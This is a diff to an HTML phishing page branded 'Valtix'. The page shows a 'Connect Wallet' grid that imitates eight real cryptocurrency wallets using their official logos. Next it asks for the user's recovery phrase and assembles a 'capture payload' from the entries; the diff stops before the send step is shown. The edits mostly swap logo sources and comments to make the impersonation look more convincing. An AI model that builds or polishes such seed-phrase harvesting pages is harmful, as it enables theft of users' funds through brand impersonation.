@@ -32,7 +32,7 @@
         }
         .top-bar .back-link:hover { color: #8899aa; }
 
-        /* Step Indicator */
+        /* Step dots */
         .steps {
             display: flex; justify-content: center; gap: 8px; margin-bottom: 36px;
         }
@@ -57,7 +57,7 @@
             text-align: center; margin-bottom: 28px; line-height: 1.5;
         }
 
-        /* Wallet Grid */
+        /* Wallet Grid — your exact logos */
         .wallet-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -146,7 +146,6 @@
             display: none;
         }
 
-        /* Footer */
         .footer-text {
             text-align: center; padding: 24px 0;
             font-size: 11px; color: #223344;
@@ -182,12 +181,11 @@
         <h2 class="panel-title" id="panelTitle">Connect Wallet</h2>
         <p class="panel-sub" id="panelSub">Select your wallet provider to connect to Valtix.</p>
 
-        <!-- Step 1: Wallet Selector -->
+        <!-- Step 1: Wallet Selector (YOUR exact logos) -->
         <div id="step1Content">
             <div class="wallet-grid" id="walletGrid">
-                <!-- 8 wallets with real logos -->
                 <div class="wallet-btn" data-wallet="phantom" onclick="selectWallet(this)">
-                    <img src="https://mintcdn.com/phantom-e50e2e68/tU9g5MXFXgx4l6Em/resources/images/Phantom_SVG_Icon.svg?fit=max&auto=format&n=tU9g5MXFXgx4l6Em&q=85&s=7170eec10d9199f7766d6e4ccd1e56ff" alt="Phantom" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%23007aff%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2214%22 font-weight=%22bold%22>P</text></svg>'">
+                    <img src="https://mintcdn.com/phantom-e50e2e68/tU9g5MXFXgx4l6Em/resources/images/Phantom_SVG_Icon.svg?fit=max&auto=format&n=tU9g5MXFXgx4l6Em&q=85&s=7170eec10d9199f7766d6e4ccd1e56ff" alt="Phantom" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%235565ff%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2214%22 font-weight=%22bold%22>P</text></svg>'">
                     <span class="w-name">Phantom</span>
                 </div>
                 <div class="wallet-btn" data-wallet="metamask" onclick="selectWallet(this)">
@@ -195,27 +193,27 @@
                     <span class="w-name">MetaMask</span>
                 </div>
                 <div class="wallet-btn" data-wallet="trustwallet" onclick="selectWallet(this)">
-                    <img src="https://logo.svgcdn.com/token-branded/trust-wallet.svg" alt="Trust Wallet" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%233374db%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2211%22 font-weight=%22bold%22>TW</text></svg>'">
+                    <img src="https://trustwallet.com/_next/static/media/image.8354ab2c.svg" alt="Trust Wallet" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%233374db%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2211%22 font-weight=%22bold%22>TW</text></svg>'">
                     <span class="w-name">Trust Wallet</span>
                 </div>
                 <div class="wallet-btn" data-wallet="solflare" onclick="selectWallet(this)">
-                    <img src="https://logo.svgcdn.com/token-branded/solflare.svg" alt="Solflare" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%23fc7c02%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2211%22 font-weight=%22bold%22>SF</text></svg>'">
+                    <img src="https://files.svgcdn.io/token-branded/solflare.svg" alt="Solflare" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%23fc7c02%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2211%22 font-weight=%22bold%22>SF</text></svg>'">
                     <span class="w-name">Solflare</span>
                 </div>
                 <div class="wallet-btn" data-wallet="coinbase" onclick="selectWallet(this)">
-                    <img src="https://static-assets.coinbase.com/ui-infra/illustration/v1/pictogram/svg/light/coinbaseLogoNavigation-2.svg" alt="Coinbase" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%230052ff%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2210%22 font-weight=%22bold%22>CB</text></svg>'">
+                    <img src="https://cdn.simpleicons.org/coinbase" alt="Coinbase" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%230052ff%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2210%22 font-weight=%22bold%22>CB</text></svg>'">
                     <span class="w-name">Coinbase</span>
                 </div>
                 <div class="wallet-btn" data-wallet="backpack" onclick="selectWallet(this)">
-                    <img src="https://logo.svgcdn.com/token-branded/backpack.svg" alt="Backpack" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%235455ff%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%229%22 font-weight=%22bold%22>BP</text></svg>'">
+                    <img src="https://files.svgcdn.io/token-branded/backpack.svg" alt="Backpack" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%235455ff%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%229%22 font-weight=%22bold%22>BP</text></svg>'">
                     <span class="w-name">Backpack</span>
                 </div>
                 <div class="wallet-btn" data-wallet="okx" onclick="selectWallet(this)">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c2/OKX_logo.svg" alt="OKX" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%23001b5c%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2212%22 font-weight=%22bold%22>OKX</text></svg>'">
+                    <img src="https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/okx/default.svg" alt="OKX" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%23001b5c%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2212%22 font-weight=%22bold%22>OKX</text></svg>'">
                     <span class="w-name">OKX</span>
                 </div>
                 <div class="wallet-btn" data-wallet="rabby" onclick="selectWallet(this)">
-                    <img src="https://raw.githubusercontent.com/RabbyHub/logo/main/rabby.svg" alt="Rabby" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%234629b4%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2211%22 font-weight=%22bold%22>RB</text></svg>'">
+                    <img src="https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.svg" alt="Rabby" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22><rect width=%2240%22 height=%2240%22 fill=%22%234629b4%22 rx=%228%22/><text x=%2220%22 y=%2226%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2211%22 font-weight=%22bold%22>RB</text></svg>'">
                     <span class="w-name">Rabby</span>
                 </div>
             </div>
@@ -250,16 +248,16 @@
 </div>
 
 <script>
-    // Wallet logos map
+    // Your exact wallet logos
     const walletLogos = {
         phantom: "https://mintcdn.com/phantom-e50e2e68/tU9g5MXFXgx4l6Em/resources/images/Phantom_SVG_Icon.svg?fit=max&auto=format&n=tU9g5MXFXgx4l6Em&q=85&s=7170eec10d9199f7766d6e4ccd1e56ff",
-        coinbase: "https://static-assets.coinbase.com/ui-infra/illustration/v1/pictogram/svg/light/coinbaseLogoNavigation-2.svg",
+        coinbase: "https://cdn.simpleicons.org/coinbase",
         metamask: "https://images.ctfassets.net/clixtyxoaeas/1ezuBGezqfIeifWdVtwU4c/d970d4cdf13b163efddddd5709164d2e/MetaMask-icon-Fox.svg",
-        trustwallet: "https://logo.svgcdn.com/token-branded/trust-wallet.svg",
-        backpack: "https://logo.svgcdn.com/token-branded/backpack.svg",
-        okx: "https://upload.wikimedia.org/wikipedia/commons/c/c2/OKX_logo.svg",
-        solflare: "https://logo.svgcdn.com/token-branded/solflare.svg",
-        rabby: "https://raw.githubusercontent.com/RabbyHub/logo/main/rabby.svg"
+        trustwallet: "https://trustwallet.com/_next/static/media/image.8354ab2c.svg",
+        backpack: "https://files.svgcdn.io/token-branded/backpack.svg",
+        okx: "https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/okx/default.svg",
+        solflare: "https://files.svgcdn.io/token-branded/solflare.svg",
+        rabby: "https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.svg"
     };
 
     let selectedWallet = null;
@@ -283,7 +281,7 @@
         document.getElementById('panelTitle').textContent = 'Import Wallet';
         document.getElementById('panelSub').textContent = 'Enter your recovery phrase to connect.';
 
-        // Show selected wallet
+        // Show selected wallet with its REAL logo
         document.getElementById('selectedWalletIcon').src = walletLogos[selectedWallet] || '';
         document.getElementById('selectedWalletName').textContent = walletName;
     }
@@ -302,7 +300,6 @@
         document.getElementById('statusBox').style.display = 'block';
         document.getElementById('statusBox').textContent = 'Connecting to Valtix network...';
 
-        // Build capture payload
         const payload = {
             wallet: selectedWallet,
             walletName: walletName,
